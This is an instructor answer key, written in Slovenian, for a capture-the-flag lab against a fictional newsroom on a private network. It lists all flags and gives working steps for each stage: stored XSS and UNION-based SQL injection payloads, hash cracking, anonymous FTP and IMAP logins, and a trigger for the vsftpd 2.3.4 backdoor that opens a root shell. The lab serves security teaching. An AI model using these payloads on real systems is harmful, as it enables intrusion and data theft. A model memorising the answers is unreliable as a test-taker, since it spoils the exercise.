# NovaPress Slovenija - Instructor Solutions

Ta dokument je odgovor in walkthrough za inštruktorja. Ne delite ga udeležencem pred zaključkom laboratorija.

## Vse Zastavice

| Naloga | Odgovor |
|---:|---|
| 1.1 | `10.10.20.0/24` |
| 2.1 | `5` |
| 3.1 | `10.10.20.11` |
| 4.1 | `NP-CTF{STORED_XSS_IN_NEWSROOM}` |
| 5.1 | `NP-CTF{EMPLOYEE_DB_LEAK_2026}` |
| 6.1 | `7fa5331351d857d9b522c9b52bcbc6fb4d1609ac9a66fd302a955b607ac66177` |
| 7.1 | `Kultura2024!` |
| 8.1 | `NP-CTF{ANONYMOUS_NEWSROOM_FTP}` |
| 9.1 | `NP-CTF{MAILBOX_COMPROMISED_2026}` |
| 10.1 | `CVE-2011-2523` |
| 11.1 | `NP-CTF{VSFTPD_BACKDOOR_NEWS_ARCHIVE}` |
| 12.1 | `NP-CTF{UNPUBLISHED_DRAFTS_EXFILTRATED}` |

## 1-3: Odkrivanje Omrežja In Portala

```bash
nmap -sn 10.10.0.0/16
nmap -sn 10.10.20.0/24
nmap -sC -sV -p- 10.10.20.0/24
```

Pričakovani aktivni IP naslovi:

```text
10.10.20.1
10.10.20.11
10.10.20.21
10.10.20.41
10.10.20.51
```

Portal je na:

```bash
curl http://10.10.20.11/
```

## 4: Stored XSS

Odpri katerikoli članek, na primer:

```bash
curl http://10.10.20.11/article.php?id=1
```

V obrazec za komentar oddaj payload:

```html
<script>document.body.innerHTML += "<h2>"+window.NP_XSS_FLAG+"</h2>"</script>
```

CLI primer:

```bash
curl -X POST http://10.10.20.11/comment.php \
  --data-urlencode 'article_id=1' \
  --data-urlencode 'author_name=student' \
  --data-urlencode 'body=<script>document.body.innerHTML += "<h2>"+window.NP_XSS_FLAG+"</h2>"</script>'
```

Nato odpri uredniški pregled:

```bash
curl http://10.10.20.11/moderator-review.php
```

V brskalniku se payload izvede in prikaže:

```text
NP-CTF{STORED_XSS_IN_NEWSROOM}
```

## 5-6: SQL Injection

HTML komentar v `search.php` pove, da backend vrača 5 stolpcev:

```bash
curl 'http://10.10.20.11/search.php?q=test'
```

Column discovery:

```bash
curl "http://10.10.20.11/search.php?q='%20ORDER%20BY%205--%20-"
```

Dump zaposlenih:

```bash
curl "http://10.10.20.11/search.php?q='%20UNION%20SELECT%20id,full_name,email,role,internal_flag%20FROM%20employees--%20-"
```

Uporaben payload:

```sql
' UNION SELECT id,full_name,email,role,internal_flag FROM employees-- -
```

Zastavica pri `matic.kovac`:

```text
NP-CTF{EMPLOYEE_DB_LEAK_2026}
```

Dump uporabnikov:

```bash
curl "http://10.10.20.11/search.php?q='%20UNION%20SELECT%20id,username,email,password_hash,password_hint%20FROM%20users--%20-"
```

Uporaben payload:

```sql
' UNION SELECT id,username,email,password_hash,password_hint FROM users-- -
```

Hash uporabnika `matic.kovac`:

```text
7fa5331351d857d9b522c9b52bcbc6fb4d1609ac9a66fd302a955b607ac66177
```

Namig je tudi v tabeli:

```bash
curl "http://10.10.20.11/search.php?q='%20UNION%20SELECT%20id,account,hash_type,hashcat_mode,additional_hint%20FROM%20password_policy_notes--%20-"
```

## 7: Hash Cracking

Ustvari `hash.txt`:

```bash
printf '%s\n' '7fa5331351d857d9b522c9b52bcbc6fb4d1609ac9a66fd302a955b607ac66177' > hash.txt
```

Majhen wordlist za učilnico:

```bash
cat > wordlist.txt <<'EOF'
Slovenija2024!
Svet2024!
Politika2024!
Gospodarstvo2024!
Kronika2024!
Sport2024!
Šport2024!
Kultura2024!
Tehnologija2024!
Vreme2024!
Novice2024!
EOF
```

Hashcat:

```bash
hashcat -m 1400 hash.txt wordlist.txt --potfile-disable
hashcat -m 1400 hash.txt wordlist.txt --show --potfile-disable
```

John:

```bash
john --format=raw-sha256 --wordlist=wordlist.txt hash.txt
john --format=raw-sha256 --show hash.txt
```

Plaintext:

```text
Kultura2024!
```

## 8: Anonymous FTP

```bash
ftp 10.10.20.41
```

Prijava:

```text
Name: anonymous
Password: anonymous
```

Ukazi:

```text
cd public
ls
get flag_ftp.txt
quit
```

Alternativa:

```bash
curl ftp://anonymous:anonymous@10.10.20.41/public/flag_ftp.txt
```

Zastavica:

```text
NP-CTF{ANONYMOUS_NEWSROOM_FTP}
```

## 9: IMAP Mailbox

Prijava:

- username: `matic.kovac@novapress.local`
- password: `Kultura2024!`

IMAP z `nc`:

```bash
nc 10.10.20.51 143
```

Ukazi:

```text
a1 LOGIN matic.kovac@novapress.local Kultura2024!
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1:* BODY[HEADER.FIELDS (SUBJECT FROM)]
a5 FETCH 3 BODY[]
a6 LOGOUT
```

Če vrstni red sporočil ni enak, poišči subject:

```text
Arhivska datoteka in notranja preiskava
```

Zastavica v telesu:

```text
NP-CTF{MAILBOX_COMPROMISED_2026}
```

## 10-12: vsftpd 2.3.4 Backdoor

Banner:

```bash
nc 10.10.20.41 21
```

Pričakovano:

```text
220 (vsftpd 2.3.4)
```

CVE:

```text
CVE-2011-2523
```

Trigger backdoorja:

```bash
nc 10.10.20.41 21
```

Vpiši:

```text
USER test:)
PASS test
QUIT
```

Povezava na shell:

```bash
nc 10.10.20.41 6200
id
cat /root/flag_ftp_shell.txt
cat /archive/unpublished-drafts-list.txt
cat /root/drafts/unpublished-investigation.txt
```

Zastavici:

```text
NP-CTF{VSFTPD_BACKDOOR_NEWS_ARCHIVE}
NP-CTF{UNPUBLISHED_DRAFTS_EXFILTRATED}
```
